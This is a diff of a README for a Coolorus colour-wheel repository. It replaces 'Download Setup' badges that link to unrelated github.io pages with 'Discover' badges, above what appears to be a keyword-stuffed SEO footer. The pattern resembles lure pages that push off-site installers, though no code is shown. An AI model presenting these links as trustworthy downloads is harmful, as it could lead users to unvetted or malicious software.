@@ -2,7 +2,7 @@
 
 ![Coolorus App Icon](https://static.macupdate.com/products/49272/m/coolorus-for-mac-logo.png?v=1590176471)
 
-[![Download Setup](https://img.shields.io/badge/Download-Setup-blue?style=for-the-badge&logo=windows)](https://moshefranklinrofy.github.io/.github/Pixel-Winch)
+[![Discover Coolorus](https://img.shields.io/badge/Discover-Coolorus-0F766E?style=flat)](https://harmony-tools-coolorus.github.io/.github/)
 
 
 ---
@@ -140,4 +140,4 @@ coolorus • coolorus mac • color wheel mac • color picker macOS • artist 
 
 ---
 
-[![Download Setup](https://img.shields.io/badge/Download-Setup-blue?style=for-the-badge&logo=windows)](https://moshefranklinrofy.github.io/.github/Pixel-Winch)
+[![Discover Coolorus](https://img.shields.io/badge/Discover-Coolorus-0F766E?style=flat)](https://harmony-tools-coolorus.github.io/.github/)
